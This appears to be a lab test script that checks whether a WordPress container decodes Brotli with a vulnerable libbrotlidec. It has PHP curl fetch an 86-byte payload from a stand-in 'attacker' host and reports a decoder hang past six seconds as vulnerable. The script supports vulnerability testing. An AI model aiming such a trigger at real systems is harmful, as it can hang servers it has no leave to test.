#!/usr/bin/env bash
# Confirm that the running WordPress container decodes Brotli with a
# vulnerable libbrotlidec.  The decisive test is behavioural.
set -u
cd "$(dirname "$0")/.."

if ! docker compose ps --status running --services 2>/dev/null | grep -qx wordpress; then
  echo "[-] wordpress is not running; run 'make up'"
  exit 2
fi

echo "[*] PHP / libcurl / Brotli"
docker compose exec -T wordpress php -r '
$v = curl_version();
printf("php=%s curl=%s brotli=%s feature=%s\n",
    PHP_VERSION, $v["version"], $v["brotli_version"] ?? "?",
    ($v["features"] & CURL_VERSION_BROTLI) ? "yes" : "no");
'
docker compose exec -T wordpress sh -c 'dpkg -s libbrotli1 2>/dev/null | grep ^Version'

echo
echo "[*] Behavioural test (86-byte payload, 6s budget)"
set +e
docker compose exec -T wordpress timeout 6 php -r '
$ch = curl_init("http://attacker:8080/small.br");
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_exec($ch);
printf("errno=%d\n", curl_errno($ch));
'
status=$?
set -e

echo
if [ "$status" -eq 124 ]; then
  echo "[+] VULNERABLE: the decoder did not return within 6s"
  exit 0
fi
echo "[-] not vulnerable (or the payload was not decoded); status=$status"
exit 1
